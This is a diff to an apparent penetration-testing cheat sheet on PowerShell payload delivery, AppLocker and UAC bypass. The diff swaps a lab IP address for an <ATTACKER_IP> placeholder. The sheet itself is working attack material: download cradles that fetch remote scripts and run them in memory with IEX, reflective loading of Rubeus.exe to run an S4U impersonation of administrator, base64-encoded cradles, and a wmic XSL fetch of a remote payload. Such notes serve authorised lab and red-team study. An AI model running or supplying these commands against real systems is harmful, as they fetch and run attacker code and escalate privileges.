@@ -1,6 +1,6 @@
 # PowerShell Delivery, AppLocker & UAC Bypass
 
-> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`
+> **Pre-req:** `source /opt/venvTools/bin/activate`
 
 ## PowerShell Download Cradles
 
@@ -13,7 +13,7 @@
 - **Context:** Download and execute PowerShell script in memory (no disk write)
 - **Payload/Method:**
   ```powershell
-  IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.ps1')
+  IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerView.ps1')
   ```
 
 ### Non-Proxy-Aware Cradle [added: 2026-04]
@@ -26,7 +26,7 @@
 - **Payload/Method:**
   ```powershell
   $h = New-Object -ComObject WinHttp.WinHttpRequest.5.1
-  $h.open('GET', 'http://10.10.16.7/script.ps1', $false)
+  $h.open('GET', 'http://<ATTACKER_IP>/script.ps1', $false)
   $h.send()
   IEX $h.responseText
   ```
@@ -41,12 +41,12 @@
 - **Payload/Method:**
   ```powershell
   # Load and run Rubeus with arguments
-  $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
+  $data = (New-Object System.Net.WebClient).DownloadData('http://<ATTACKER_IP>/Rubeus.exe')
   $assem = [System.Reflection.Assembly]::Load($data)
   [Rubeus.Program]::Main("s4u /user:web01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/fileserver".Split())
 
   # Load a DLL and call specific method
-  $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/ClassLibrary1.dll')
+  $data = (New-Object System.Net.WebClient).DownloadData('http://<ATTACKER_IP>/ClassLibrary1.dll')
   $assem = [System.Reflection.Assembly]::Load($data)
   $class = $assem.GetType("ClassLibrary1.Class1")
   $method = $class.GetMethod("runner")
@@ -63,7 +63,7 @@
 - **Payload/Method:**
   ```powershell
   # Encode a one-liner
-  $command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.16.7/script.ps1")'
+  $command = 'IEX (New-Object Net.WebClient).DownloadString("http://<ATTACKER_IP>/script.ps1")'
   $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
   $encodedCommand = [Convert]::ToBase64String($bytes)
 
@@ -101,7 +101,7 @@
   python payload.py
 
   # XSL via wmic (LOLBAS):
-  wmic os get /format:"http://10.10.16.7/payload.xsl"
+  wmic os get /format:"http://<ATTACKER_IP>/payload.xsl"
   ```
 
 ### AppLocker Enumeration [added: 2026-04]
